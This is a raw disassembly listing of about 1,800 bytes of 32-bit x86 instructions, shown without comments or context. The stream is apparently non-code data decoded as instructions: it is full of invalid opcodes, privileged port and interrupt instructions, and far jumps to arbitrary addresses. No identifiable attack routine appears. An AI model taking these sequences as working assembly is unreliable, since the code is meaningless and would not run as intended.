  40bba8:	mov    ecx,0x7bf0e1d9
  40bbad:	pop    edi
  40bbae:	cli    
  40bbaf:	out    dx,eax
  40bbb0:	jo     0x40bbc7
  40bbb2:	push   ss
  40bbb3:	not    BYTE PTR [edx-0x103baa5f]
  40bbb9:	add    al,0x24
  40bbbb:	sbb    DWORD PTR [esi],ecx
  40bbbd:	and    ebx,DWORD PTR [esi]
  40bbbf:	sti    
  40bbc0:	(bad)  
  40bbc1:	fist   DWORD PTR [edx]
  40bbc3:	or     al,0xd6
  40bbc5:	ds inc edi
  40bbc7:	cmp    eax,0xb73adfaf
  40bbcc:	bound  ecx,QWORD PTR [ebx]
  40bbce:	dec    eax
  40bbcf:	ror    BYTE PTR [ebp+ecx*4-0x6702466f],0xde
  40bbd7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bbd8:	sbb    edx,edx
  40bbda:	dec    edi
  40bbdb:	call   0x9992:0x97cf4d66
  40bbe2:	pushf  
  40bbe3:	ds pop ss
  40bbe5:	mov    DWORD PTR [edi+0x33098d6e],0x99da3285
  40bbef:	mov    BYTE PTR [ecx-0x7e24efb],cl
  40bbf5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bbf6:	sub    BYTE PTR [esi],ch
  40bbf8:	add    dl,BYTE PTR [esi]
  40bbfa:	xor    DWORD PTR [edx+0x5e],0xf8f42630
  40bc01:	data16 cmp ah,BYTE PTR [edi]
  40bc04:	test   DWORD PTR [eax],0xf2a93b7f
  40bc0a:	pusha  
  40bc0b:	or     BYTE PTR [eax+0x2d4a1640],ch
  40bc11:	rcl    DWORD PTR [esi],cl
  40bc13:	icebp  
  40bc14:	jns    0x40bc3b
  40bc16:	cmp    DWORD PTR [ebx+edi*4],esp
  40bc19:	in     eax,0xcd
  40bc1b:	or     DWORD PTR [ecx-0xe26383],0xede88452
  40bc25:	and    edi,DWORD PTR ds:0x65792d8e
  40bc2b:	addr16 sbb eax,0x1266cdfb
  40bc31:	adc    dh,dh
  40bc33:	or     eax,0x22111a94
  40bc38:	xchg   esi,eax
  40bc39:	xor    al,0x41
  40bc3b:	ret    
  40bc3c:	stos   DWORD PTR es:[edi],eax
  40bc3d:	daa    
  40bc3e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bc3f:	push   cs
  40bc40:	ins    DWORD PTR es:[edi],dx
  40bc41:	dec    ebx
  40bc42:	ds test eax,0x79f5da93
  40bc48:	xchg   ebp,eax
  40bc49:	in     al,0x9e
  40bc4b:	push   cs
  40bc4c:	scas   eax,DWORD PTR es:[edi]
  40bc4d:	add    DWORD PTR ds:0x5b6a8668,ebx
  40bc53:	pop    ebp
  40bc54:	pop    eax
  40bc55:	mov    esp,DWORD PTR [esi+0xd930961]
  40bc5b:	fsin   
  40bc5d:	sub    DWORD PTR [esi],ecx
  40bc5f:	jmp    0x40bc3a
  40bc61:	xor    eax,0x5a6f409e
  40bc66:	push   cs
  40bc67:	(bad)  
  40bc69:	int    0xa7
  40bc6b:	je     0x40bcba
  40bc6d:	jb     0x40bc5d
  40bc6f:	or     DWORD PTR [ecx-0x10ee5b11],ebp
  40bc75:	fnsave [eax-0x25]
  40bc78:	test   BYTE PTR [eax-0x27],ch
  40bc7b:	add    al,0x7c
  40bc7d:	push   ebx
  40bc7e:	add    al,0xda
  40bc80:	push   0x47
  40bc82:	outs   dx,BYTE PTR ds:[esi]
  40bc83:	int3   
  40bc84:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bc85:	jnp    0x40bc37
  40bc87:	into   
  40bc88:	dec    ebx
  40bc89:	mov    bl,0x7
  40bc8b:	mov    edi,0x66857803
  40bc90:	mov    ebp,0xab4fe669
  40bc95:	mov    DWORD PTR [ecx+0x6569757a],edi
  40bc9b:	sbb    cl,BYTE PTR gs:[edi-0xe44b627]
  40bca2:	pop    ss
  40bca3:	sub    ah,BYTE PTR [ecx+0x1370df73]
  40bca9:	out    0x15,al
  40bcab:	cmc    
  40bcac:	jmp    0xa3d6797d
  40bcb1:	xor    al,0x66
  40bcb3:	push   es
  40bcb4:	inc    esi
  40bcb5:	xchg   ecx,eax
  40bcb6:	xchg   esp,eax
  40bcb7:	adc    ebp,ecx
  40bcb9:	and    DWORD PTR [edx-0x4b3cefe],esp
  40bcbf:	dec    esi
  40bcc0:	and    al,0xcf
  40bcc2:	leave  
  40bcc3:	add    eax,0xbc4891c4
  40bcc8:	ss into 
  40bcca:	sbb    esp,esp
  40bccc:	jg     0x40bc4f
  40bcce:	inc    esi
  40bccf:	mov    bl,0x85
  40bcd1:	mov    esp,DWORD PTR [ebx-0x79]
  40bcd4:	pop    edx
  40bcd5:	push   esp
  40bcd6:	(bad)  
  40bcd8:	daa    
  40bcd9:	call   0x73e36df8
  40bcde:	mov    WORD PTR [ebx+0x6f24dea5],ss
  40bce4:	xchg   esi,eax
  40bce5:	adc    ah,ch
  40bce7:	int3   
  40bce8:	(bad)  
  40bce9:	mov    ss,WORD PTR [ecx+0x8]
  40bcec:	and    edi,DWORD PTR [edx+0x74]
  40bcef:	inc    edi
  40bcf0:	inc    edx
  40bcf1:	rcl    al,0xb9
  40bcf4:	fs xchg esp,eax
  40bcf6:	mov    al,0xf1
  40bcf8:	push   esp
  40bcf9:	je     0x40bc93
  40bcfb:	sub    ebp,eax
  40bcfd:	cwde   
  40bcfe:	mov    esp,0xb0bc9125
  40bd03:	jmp    0x1b5:0xbed5a896
  40bd0a:	adc    al,0xa6
  40bd0c:	inc    ebp
  40bd0d:	in     eax,0xe8
  40bd0f:	xor    BYTE PTR [edi-0x44eef19a],0x49
  40bd16:	xor    BYTE PTR [esi+0x1],dh
  40bd19:	jno    0x40bd8c
  40bd1b:	jle    0x40bcf7
  40bd1d:	fstp   DWORD PTR [esi]
  40bd1f:	loopne 0x40bd42
  40bd21:	into   
  40bd22:	ja     0x40bcfa
  40bd24:	into   
  40bd25:	xchg   esi,eax
  40bd26:	cmp    eax,0x662f7bc
  40bd2b:	iret   
  40bd2c:	sub    al,0xf3
  40bd2e:	sbb    al,bh
  40bd30:	fwait
  40bd31:	pop    edi
  40bd32:	xchg   ebx,eax
  40bd33:	jle    0x40bd11
  40bd35:	mov    dh,0x9e
  40bd37:	stos   BYTE PTR es:[edi],al
  40bd38:	rcr    BYTE PTR [edi],1
  40bd3a:	(bad)  
  40bd3c:	stos   DWORD PTR es:[edi],eax
  40bd3d:	inc    edx
  40bd3e:	(bad)  
  40bd3f:	mov    eax,ds:0xc2f2e24a
  40bd44:	pop    ebp
  40bd45:	inc    edx
  40bd46:	icebp  
  40bd47:	repz and eax,DWORD PTR [ecx+esi*2-0x67dfac66]
  40bd4f:	sbb    al,0x52
  40bd51:	out    dx,al
  40bd52:	xchg   edi,eax
  40bd53:	or     BYTE PTR [eax-0x683fbbce],cl
  40bd59:	ins    DWORD PTR es:[edi],dx
  40bd5a:	sub    ch,BYTE PTR ds:0x749d46f5
  40bd60:	dec    DWORD PTR [edx]
  40bd62:	dec    esi
  40bd63:	mov    bl,0x16
  40bd65:	pop    eax
  40bd66:	inc    ebp
  40bd67:	xchg   ecx,eax
  40bd68:	mov    cl,0xd6
  40bd6a:	aas    
  40bd6b:	pop    ecx
  40bd6c:	mov    dl,0xe0
  40bd6e:	stc    
  40bd6f:	test   BYTE PTR [eax+ebx*8],bl
  40bd72:	outs   dx,BYTE PTR ds:[esi]
  40bd73:	xor    esi,eax
  40bd75:	rcl    eax,0xfa
  40bd78:	cs pop ecx
  40bd7a:	add    BYTE PTR [ecx-0x5345d521],0x8e
  40bd81:	xor    al,0x30
  40bd83:	in     al,dx
  40bd84:	rcl    ch,0x9c
  40bd87:	sub    DWORD PTR [ecx],edi
  40bd89:	pop    ebx
  40bd8a:	pushf  
  40bd8b:	dec    edx
  40bd8c:	int3   
  40bd8d:	mov    edi,0xd552cd8c
  40bd92:	cmp    ch,BYTE PTR ds:0x36240605
  40bd98:	push   edx
  40bd99:	sbb    al,0x86
  40bd9b:	cli    
  40bd9c:	jo     0x40bd3e
  40bd9e:	and    eax,0xd27d62d9
  40bda3:	popa   
  40bda4:	sbb    ebp,esp
  40bda6:	inc    ebx
  40bda7:	lahf   
  40bda8:	jae    0x40bd4c
  40bdaa:	call   0x2280915f
  40bdaf:	xchg   edx,eax
  40bdb0:	jg     0x40bd79
  40bdb2:	mov    ebx,DWORD PTR [ecx]
  40bdb4:	in     al,dx
  40bdb5:	mov    al,0xb2
  40bdb7:	jp     0x40bd60
  40bdb9:	ror    ch,cl
  40bdbb:	cmp    al,dh
  40bdbd:	mov    ecx,eax
  40bdbf:	adc    cl,dh
  40bdc1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bdc2:	(bad)  
  40bdc3:	mov    BYTE PTR [eax],ch
  40bdc5:	dec    eax
  40bdc6:	and    al,dl
  40bdc8:	or     cl,BYTE PTR [eax-0x21204778]
  40bdce:	mov    bh,0xe
  40bdd0:	loopne 0x40bdd5
  40bdd2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bdd3:	cmp    al,0x7
  40bdd5:	(bad)  
  40bdd6:	rep lods al,BYTE PTR ds:[esi]
  40bdd8:	push   eax
  40bdd9:	adc    al,BYTE PTR [bp+di]
  40bddc:	mov    cl,0x82
  40bdde:	hlt    
  40bddf:	jo     0x40be26
  40bde1:	clc    
  40bde2:	idiv   bl
  40bde4:	cmp    esi,DWORD PTR ds:0x51a0664e
  40bdea:	or     al,0xb1
  40bdec:	jns    0x40bdce
  40bdee:	pop    edi
  40bdef:	push   edx
  40bdf0:	loopne 0x40be58
  40bdf2:	ret    
  40bdf3:	adc    al,0x4e
  40bdf5:	lods   eax,DWORD PTR ds:[esi]
  40bdf6:	hlt    
  40bdf7:	and    edi,0x7b
  40bdfa:	mov    edx,0x95c632
  40bdff:	ins    DWORD PTR es:[edi],dx
  40be00:	xchg   ebx,eax
  40be01:	loopne 0x40bdb2
  40be03:	and    DWORD PTR [ebp+0x28],eax
  40be06:	add    al,BYTE PTR [edx-0x37]
  40be09:	shl    BYTE PTR [ebx+0x62],1
  40be0c:	ins    BYTE PTR es:[edi],dx
  40be0d:	bound  ecx,QWORD PTR [esi-0x27a31649]
  40be13:	leave  
  40be14:	(bad)  
  40be15:	bndldx bnd2,[edx+esi*4-0x3a]
  40be1a:	(bad)  
  40be1b:	push   0x54
  40be1d:	add    ebx,ebx
  40be1f:	popa   
  40be20:	jp     0x40be3d
  40be22:	in     al,dx
  40be23:	mov    dl,0x50
  40be25:	add    ebp,DWORD PTR ds:0x11a21d13
  40be2b:	aaa    
  40be2c:	adc    esp,esi
  40be2e:	leave  
  40be2f:	dec    ecx
  40be30:	or     eax,0x61c4fa0c
  40be35:	or     DWORD PTR [edi+ebp*2],eax
  40be38:	enter  0xff70,0xb6
  40be3c:	jmp    0x4eb2:0x535a80a0
  40be43:	xlat   BYTE PTR ds:[ebx]
  40be44:	or     eax,0xc14a407b
  40be49:	add    esi,DWORD PTR [edi+edi*4+0x640ee86e]
  40be50:	mov    ebx,0x965ba121
  40be55:	cwde   
  40be56:	mov    al,ds:0x2e1d4e98
  40be5b:	mov    edx,0xa3a5c287
  40be60:	pushf  
  40be61:	leave  
  40be62:	mov    bl,0x85
  40be64:	mov    edx,0x6a91df51
  40be69:	push   esp
  40be6a:	cmp    BYTE PTR [eax-0x30b5c63b],bl
  40be70:	and    DWORD PTR [eax+0x6b],edx
  40be73:	mov    esp,0x80f77eca
  40be78:	sub    ebx,DWORD PTR [ebp-0x7a]
  40be7b:	ror    esi,0x9c
  40be7e:	sbb    ecx,DWORD PTR [edi-0x7d58d139]
  40be84:	sub    ebp,edi
  40be86:	fist   WORD PTR gs:[ebp-0x31b20d97]
  40be8d:	mov    ecx,0xbe352099
  40be92:	ficom  DWORD PTR [edi]
  40be94:	lock jg 0x40bee1
  40be97:	in     al,0x63
  40be99:	loopne 0x40bea7
  40be9b:	mov    ds:0xbbfe18ad,eax
  40bea0:	(bad)  
  40bea1:	in     eax,dx
  40bea2:	das    
  40bea3:	mov    ah,0x37
  40bea5:	scas   eax,DWORD PTR es:[edi]
  40bea6:	pop    edi
  40bea7:	aam    0xb4
  40bea9:	call   0x9e62:0x272d42c9
  40beb0:	sub    al,0x56
  40beb2:	(bad)  
  40beb3:	pop    ebx
  40beb4:	inc    ebp
  40beb5:	mov    edx,0x2d31c19a
  40beba:	push   eax
  40bebb:	lods   al,BYTE PTR ds:[esi]
  40bebc:	mov    bh,0x52
  40bebe:	ret    0x37e8
  40bec1:	ror    DWORD PTR [ebp+0x2f8a4ad3],1
  40bec7:	pop    edi
  40bec8:	sub    eax,0x986ba96e
  40becd:	test   eax,0xb451ec80
  40bed2:	in     al,dx
  40bed3:	or     al,0xc7
  40bed5:	sbb    BYTE PTR [edi+0x42],bl
  40bed8:	push   ecx
  40bed9:	adc    DWORD PTR [eax],esp
  40bedb:	(bad)  
  40bedc:	sub    eax,0x53087fc3
  40bee1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bee2:	mov    bl,0xb1
  40bee4:	sbb    ecx,ecx
  40bee6:	stos   BYTE PTR es:[edi],al
  40bee7:	fwait
  40bee8:	inc    edx
  40bee9:	jnp    0x40bece
  40beeb:	mov    dh,0x8f
  40beed:	push   esi
  40beee:	and    BYTE PTR [esi],ch
  40bef0:	or     bh,BYTE PTR [eax]
  40bef2:	push   ds
  40bef3:	pop    ds
  40bef4:	mov    WORD PTR [esi],es
  40bef6:	push   0xffffffa1
  40bef8:	int3   
  40bef9:	lods   eax,DWORD PTR ds:[esi]
  40befa:	xchg   ebp,eax
  40befb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40befc:	(bad)  
  40befd:	cld    
  40befe:	cdq    
  40beff:	add    bl,BYTE PTR [eax+0x5a]
  40bf02:	jl     0x40bec7
  40bf04:	and    ecx,DWORD PTR [edx+0x431ffbdb]
  40bf0a:	rol    eax,cl
  40bf0c:	fisub  WORD PTR [ecx]
  40bf0e:	mov    dl,0x59
  40bf10:	xor    esp,DWORD PTR [eax]
  40bf12:	dec    eax
  40bf13:	imul   ecx,DWORD PTR [esi+0x3c],0x4
  40bf17:	mov    ah,ah
  40bf19:	dec    esi
  40bf1a:	dec    ebp
  40bf1b:	jmp    0x78b2a224
  40bf20:	ja     0x40bf02
  40bf22:	xchg   ebx,eax
  40bf23:	jge    0x40bf2b
  40bf25:	lock push ecx
  40bf27:	(bad)  
  40bf28:	outs   dx,BYTE PTR ds:[esi]
  40bf29:	sub    eax,0x475e3bfb
  40bf2e:	ficomp DWORD PTR [ecx]
  40bf30:	ss add al,0xfd
  40bf33:	imul   esp,esi,0xffffffec
  40bf36:	pop    ebx
  40bf37:	cmp    eax,0x35f0e766
  40bf3c:	daa    
  40bf3d:	push   ecx
  40bf3e:	xor    eax,0xddad6d85
  40bf43:	jmp    0xf848:0x864631d3
  40bf4a:	mov    ds:0x62864795,eax
  40bf4f:	rol    BYTE PTR [edi+ebp*2+0x29d88334],0x92
  40bf57:	sub    dl,BYTE PTR [ebp+0x48a7be7d]
  40bf5d:	mov    DWORD PTR [ebx-0x3f],ebp
  40bf60:	mov    dh,0x54
  40bf62:	pusha  
  40bf63:	scas   al,BYTE PTR es:[edi]
  40bf64:	lods   al,BYTE PTR ds:[esi]
  40bf65:	dec    ebp
  40bf66:	dec    edi
  40bf67:	clc    
  40bf68:	retf   0xb0eb
  40bf6b:	inc    edx
  40bf6c:	enter  0x51f,0x81
  40bf70:	jne    0x40bf83
  40bf72:	add    eax,0x32a930e1
  40bf77:	lds    edi,FWORD PTR [ecx-0x6f]
  40bf7a:	pop    ds
  40bf7b:	add    al,0x43
  40bf7d:	sti    
  40bf7e:	test   DWORD PTR es:[bx+si],ecx
  40bf82:	mov    cl,0x25
  40bf84:	cmp    dh,bh
  40bf86:	(bad)  
  40bf87:	in     al,0xae
  40bf89:	pushf  
  40bf8a:	push   ebx
  40bf8b:	lahf   
  40bf8c:	cwde   
  40bf8d:	repz xchg esp,eax
  40bf8f:	loopne 0x40bf27
  40bf91:	push   edx
  40bf92:	in     al,0x1d
  40bf94:	push   cs
  40bf95:	xor    edi,eax
  40bf97:	lock sub al,BYTE PTR [eax]
  40bf9a:	mov    bh,0xae
  40bf9c:	sub    al,0x35
  40bf9e:	stos   BYTE PTR es:[edi],al
  40bf9f:	jbe    0x40bf7b
  40bfa1:	push   es
  40bfa2:	out    0xdb,eax
  40bfa4:	out    0xe1,al
  40bfa6:	out    0x6b,eax
  40bfa8:	sbb    al,0x60
  40bfaa:	icebp  
  40bfab:	mov    ds,ecx
  40bfad:	lds    edi,FWORD PTR [ebp+eax*8-0x658ce89c]
  40bfb4:	imul   eax,DWORD PTR [ebx],0xffffffe0
  40bfb7:	and    eax,0xfbf5dccb
  40bfbc:	xlat   BYTE PTR ds:[ebx]
  40bfbd:	pop    ecx
  40bfbe:	dec    eax
  40bfbf:	(bad)  
  40bfc0:	sub    bh,BYTE PTR [esi]
  40bfc2:	pop    edx
  40bfc3:	xor    bl,BYTE PTR [eax+0x1eb6b4d2]
  40bfc9:	shl    DWORD PTR [ebp+0x5870cd3e],cl
  40bfcf:	ins    DWORD PTR es:[edi],dx
  40bfd0:	xchg   ax,ax
  40bfd2:	add    esp,eax
  40bfd4:	stos   DWORD PTR es:[edi],eax
  40bfd5:	arpl   WORD PTR [ebx-0x6a],si
  40bfd8:	js     0x40bf9f
  40bfda:	jns    0x40bf85
  40bfdc:	xacquire xchg DWORD PTR [ebp-0xc],edi
  40bfe0:	pusha  
  40bfe1:	iret   
  40bfe2:	push   esi
  40bfe3:	sub    eax,ecx
  40bfe5:	ret    0xa7a8
  40bfe8:	(bad)  
  40bfe9:	das    
  40bfea:	and    ah,0x89
  40bfed:	xchg   ebx,ebx
  40bfef:	and    DWORD PTR [ecx+0x3b],eax
  40bff2:	ja     0x40c062
  40bff4:	outs   dx,BYTE PTR ds:[esi]
  40bff5:	ss daa 
  40bff7:	push   eax
  40bff8:	mov    ebp,0x23f635e0
  40bffd:	mov    edi,0xa79e9352
  40c002:	adc    al,0x3f
  40c004:	test   ecx,0xf554bdcc
  40c00a:	aaa    
  40c00b:	scas   al,BYTE PTR es:[edi]
  40c00c:	sbb    al,0x6c
  40c00e:	mov    DWORD PTR [ecx-0x3d726e8a],esi
  40c014:	out    0x1a,al
  40c016:	aam    0xb9
  40c018:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c019:	icebp  
  40c01a:	mov    dl,0x8c
  40c01c:	scas   eax,DWORD PTR es:[edi]
  40c01d:	mov    cl,BYTE PTR [ebx+ebp*4+0x3a]
  40c021:	inc    ebp
  40c022:	inc    ebx
  40c023:	sbb    eax,DWORD PTR [ecx]
  40c025:	cmp    bh,BYTE PTR [edx]
  40c027:	jns    0x40c045
  40c029:	fnstsw WORD PTR [ecx+ebp*4+0x47]
  40c02d:	rcr    ah,cl
  40c02f:	or     esp,DWORD PTR [ebx]
  40c031:	gs mov esp,0xe369074a
  40c037:	fld    QWORD PTR [ebp+0x46]
  40c03a:	dec    ebx
  40c03b:	push   edi
  40c03c:	or     dl,BYTE PTR ss:[edi-0x2267492f]
  40c043:	pop    DWORD PTR [eiz*8+0x746edb39]
  40c04a:	add    bh,BYTE PTR [esp+eax*4-0x14]
  40c04e:	jnp    0x40c02e
  40c050:	mov    eax,ds:0x88c81c7f
  40c055:	cmp    al,0xb0
  40c057:	dec    edi
  40c058:	mov    cs,WORD PTR [eax+0x7c234150]
  40c05e:	sub    eax,0x24145659
  40c063:	lods   al,BYTE PTR ds:[esi]
  40c064:	rcl    esp,cl
  40c066:	cmp    al,0xee
  40c068:	bound  edi,QWORD PTR [esp+ebp*4]
  40c06b:	int    0xba
  40c06d:	jbe    0x40c0dc
  40c06f:	cdq    
  40c070:	add    BYTE PTR ds:0x60e58974,cl
  40c076:	into   
  40c077:	ds push ebx
  40c079:	mov    ah,0x2a
  40c07b:	pop    esp
  40c07c:	or     cl,BYTE PTR [esi-0x461757a4]
  40c082:	(bad)  [esi-0x772ca907]
  40c088:	pop    edx
  40c089:	xchg   ebp,eax
  40c08a:	xchg   edi,eax
  40c08b:	scas   eax,DWORD PTR es:[edi]
  40c08c:	sahf   
  40c08d:	shl    BYTE PTR [eax-0x1ea6db70],0xe5
  40c094:	xor    al,0xc3
  40c096:	shl    BYTE PTR ss:[esi+0x4e],1
  40c09a:	xor    DWORD PTR [edx-0x59],esi
  40c09d:	inc    esp
  40c09e:	int    0x47
  40c0a0:	int    0x9
  40c0a2:	adc    BYTE PTR [edi+0x50],al
  40c0a5:	mov    esi,0x7e84211e
  40c0aa:	and    esi,esi
  40c0ac:	sub    ah,BYTE PTR [ecx+0x223e03e2]
  40c0b2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c0b3:	ret    
  40c0b4:	sbb    al,0x80
  40c0b6:	(bad)  
  40c0b7:	mov    edi,0xc1a852c1
  40c0bc:	ja     0x40c06c
  40c0be:	and    eax,0x10341d06
  40c0c3:	out    dx,al
  40c0c4:	sub    eax,0xc16b3c11
  40c0c9:	fcmovne st,st(0)
  40c0cb:	call   0x2f09:0xafe4de4
  40c0d2:	inc    eax
  40c0d3:	jno    0x40c138
  40c0d5:	mov    cl,0xb2
  40c0d7:	lods   al,BYTE PTR ds:[esi]
  40c0d8:	and    DWORD PTR [eax+0x39],eax
  40c0db:	popa   
  40c0dc:	sbb    ebp,ebp
  40c0de:	in     al,dx
  40c0df:	xchg   esp,eax
  40c0e0:	add    ch,dl
  40c0e2:	aad    0xca
  40c0e4:	(bad)  
  40c0e6:	(bad)  
  40c0e7:	xchg   ebp,eax
  40c0e8:	sahf   
  40c0e9:	les    edi,FWORD PTR [edx]
  40c0eb:	bound  ebx,QWORD PTR [esi]
  40c0ed:	fdivr  DWORD PTR [esi]
  40c0ef:	enter  0xaf4d,0xf4
  40c0f3:	dec    eax
  40c0f4:	iret   
  40c0f5:	mov    edx,0x7835f2e6
  40c0fa:	dec    esp
  40c0fb:	add    BYTE PTR [eax],al
  40c0fd:	mov    cl,0xb4
  40c0ff:	fs adc al,0x56
  40c102:	push   esp
  40c103:	ret    0x16
  40c106:	or     BYTE PTR [edx+0x76ccdc53],ch
  40c10c:	pusha  
  40c10d:	call   0x15db:0x1bf7c37c
  40c114:	mov    es,WORD PTR [edx+ebx*2-0x6610c0a4]
  40c11b:	test   al,0xd2
  40c11d:	scas   eax,DWORD PTR es:[edi]
  40c11e:	xchg   edi,eax
  40c11f:	xor    eax,0x4ec512ba
  40c124:	(bad)  
  40c125:	mov    ch,0xd5
  40c127:	and    ebx,DWORD PTR [esi+ebp*2]
  40c12a:	push   ecx
  40c12b:	out    dx,al
  40c12c:	xor    al,bl
  40c12e:	push   eax
  40c12f:	out    0x7b,al
  40c131:	mov    ch,0x5f
  40c133:	test   BYTE PTR [edi-0x73f8b680],dl
  40c139:	mov    al,0x1e
  40c13b:	shl    BYTE PTR [edi-0x5b],1
  40c13e:	mov    ch,0xee
  40c140:	addr16 dec eax
  40c142:	fidiv  WORD PTR [edx+eax*4]
  40c145:	mov    ds:0x2368a10e,al
  40c14a:	push   ds
  40c14b:	sbb    DWORD PTR [edi],0x3761e3ad
  40c151:	cmp    eax,esp
  40c153:	lea    esp,[ecx+0x36135172]
  40c159:	cmp    al,cl
  40c15b:	lea    esi,[edx+0x58]
  40c15e:	add    bh,BYTE PTR [esi]
  40c160:	cmp    eax,0xc8eae7b2
  40c165:	fadd   QWORD PTR [ecx-0x21]
  40c168:	test   BYTE PTR [esi+0x13],dh
  40c16b:	fild   QWORD PTR [edx+0x3b]
  40c16e:	dec    eax
  40c16f:	xor    BYTE PTR [esi],0x2a
  40c172:	bound  esp,QWORD PTR [edx]
  40c174:	jb     0x40c147
  40c176:	or     edi,DWORD PTR ds:0xf5e4a341
  40c17c:	int3   
  40c17d:	ds scas al,BYTE PTR es:[edi]
  40c17f:	sbb    BYTE PTR [edx+0xf],bl
  40c182:	les    ebx,FWORD PTR [edi]
  40c184:	add    dx,bp
  40c187:	(bad)  
  40c188:	dec    esp
  40c189:	mov    BYTE PTR [ecx],cl
  40c18b:	add    DWORD PTR [ecx],ebx
  40c18d:	mov    ds:0x43468e76,eax
  40c192:	add    edi,DWORD PTR cs:[edi]
  40c195:	mov    ebp,0x707ffd10
  40c19a:	cwde   
  40c19b:	popf   
  40c19c:	sub    ebx,DWORD PTR [edx]
  40c19e:	add    dh,cl
  40c1a0:	sub    dh,bl
  40c1a2:	push   ebx
  40c1a3:	add    edi,ecx
  40c1a5:	push   edx
  40c1a6:	xchg   ebp,eax
  40c1a7:	aas    
  40c1a8:	cmc    
  40c1a9:	lea    esi,[ebp-0x5e]
  40c1ac:	ins    BYTE PTR es:[edi],dx
  40c1ad:	shr    DWORD PTR [ecx-0x1d],cl
  40c1b0:	xchg   ecx,eax
  40c1b1:	rcl    ch,0x48
  40c1b4:	cld    
  40c1b5:	jmp    0x1556:0x8079c749
  40c1bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c1bd:	pusha  
  40c1be:	push   esp
  40c1bf:	dec    eax
  40c1c0:	shr    DWORD PTR [edi+0x469e1e45],1
  40c1c6:	add    ebp,DWORD PTR [ebp+0x4a308666]
  40c1cc:	popa   
  40c1cd:	(bad)  
  40c1cf:	int3   
  40c1d0:	(bad)  
  40c1d1:	repz or BYTE PTR [ebx+0x54],cl
  40c1d5:	xchg   ebx,eax
  40c1d6:	or     eax,0xfa69676e
  40c1db:	pop    ecx
  40c1dc:	icebp  
  40c1dd:	inc    esi
  40c1de:	sti    
  40c1df:	mov    ebp,0x7048ba7f
  40c1e4:	adc    al,0x1c
  40c1e6:	pop    esi
  40c1e7:	test   DWORD PTR [edi],edi
  40c1e9:	mov    cl,0x6e
  40c1eb:	cmp    dh,BYTE PTR [ebx]
  40c1ed:	in     eax,dx
  40c1ee:	xchg   BYTE PTR [edx+esi*2-0x2c1443b6],dl
  40c1f5:	scas   al,BYTE PTR es:[edi]
  40c1f6:	jp     0x40c1ae
  40c1f8:	es mov ebx,0xe06b5eb6
  40c1fe:	adc    al,0x95
  40c200:	aam    0x9e
  40c202:	les    ebp,FWORD PTR [edx-0x7d]
  40c205:	sub    esi,esi
  40c207:	dec    edi
  40c208:	adc    cl,ah
  40c20a:	push   edi
  40c20b:	call   0x5df1:0xe4689bf6
  40c212:	sbb    edx,DWORD PTR [ebx-0xaaeff44]
  40c218:	rcl    DWORD PTR [edx+0x50bed95f],cl
  40c21e:	pop    es
  40c21f:	call   0xe9053ba5
  40c224:	dec    cx
  40c226:	ja     0x40c1b6
  40c228:	jno    0x40c1e8
  40c22a:	out    0x89,eax
  40c22c:	xor    DWORD PTR [edi+ebx*1+0x17],ebx
  40c230:	ins    DWORD PTR es:[edi],dx
  40c231:	iret   
  40c232:	pop    edx
  40c233:	mov    DWORD PTR [eax],0xe3672001
  40c239:	adc    al,BYTE PTR [ecx]
  40c23b:	jae    0x40c1d1
  40c23d:	dec    edi
  40c23e:	push   0xffffffe0
  40c240:	addr16 popf 
  40c242:	icebp  
  40c243:	(bad)  
  40c244:	xchg   DWORD PTR [esi-0x2d13ef8e],edi
  40c24a:	mov    bl,bh
  40c24c:	sub    eax,0x799633
  40c251:	inc    ecx
  40c252:	xchg   ebp,eax
  40c253:	jmp    0x7ed4:0x5668c546
  40c25a:	and    BYTE PTR [ebx-0x531d0a],ah
  40c260:	lahf   
  40c261:	test   al,0x2e
  40c263:	cli    
  40c264:	dec    ebp
  40c265:	jae    0x40c2ae
  40c267:	ins    DWORD PTR es:[edi],dx
  40c268:	stc    
  40c269:	arpl   WORD PTR [edx-0x2e],sp
  40c26c:	neg    DWORD PTR [edx+ebp*8]
  40c26f:	scas   al,BYTE PTR es:[edi]
  40c270:	xor    ecx,DWORD PTR [ecx+0x75]
  40c273:	jge    0x40c2ef
  40c275:	sub    ecx,ebp
  40c277:	xchg   BYTE PTR ss:[eax+0x2d906919],bl
  40c27e:	stos   DWORD PTR es:[edi],eax
  40c27f:	pop    ds
  40c280:	mov    cl,0x74
  40c282:	xchg   ecx,eax
  40c283:	sub    DWORD PTR ds:0xce18b5c0,ebp
  40c289:	rcl    BYTE PTR [ebp-0x4a73eb2],1
  40c28f:	or     eax,0x79560f68
  40c294:	xchg   esi,eax
  40c295:	ins    DWORD PTR es:[edi],dx
  40c296:	mov    al,0x5b
  40c298:	out    0x95,eax
  40c29a:	inc    ecx
  40c29b:	pushf  
  40c29c:	fisttp QWORD PTR [eax+0x61f3579a]
  40c2a2:	punpckhdq mm5,QWORD PTR [edi-0x128dfb2f]
  40c2a9:	dec    eax
  40c2aa:	les    ebp,FWORD PTR [esp+eiz*8]
  40c2ad:	mov    dl,0xe8
  40c2af:	jmp    0xe7c072e6
  40c2b4:	xor    al,BYTE PTR [edx+0x2a55741c]
  40c2ba:	jmp    0x2e1fe145
  40c2bf:	pop    es
  40c2c0:	pop    ds
  40c2c1:	pop    eax
  40c2c2:	jb     0x40c265
  40c2c4:	adc    bl,BYTE PTR [eax+0x604cd367]
  40c2ca:	push   esi
  40c2cb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c2cc:	jmp    0x5a2b27d5
  40c2d1:	sbb    ebx,DWORD PTR [edx]
  40c2d3:	push   0x66
  40c2d5:	xchg   esp,eax
  40c2d6:	cmp    esp,eax
  40c2d8:	pop    edx
  40c2d9:	into   
  40c2da:	pop    eax
  40c2db:	(bad)  
  40c2dc:	and    eax,0xf5a54a14
  40c2e1:	sub    eax,0x97dedaeb
  40c2e6:	pop    edi
  40c2e7:	sbb    esi,DWORD PTR [edi]
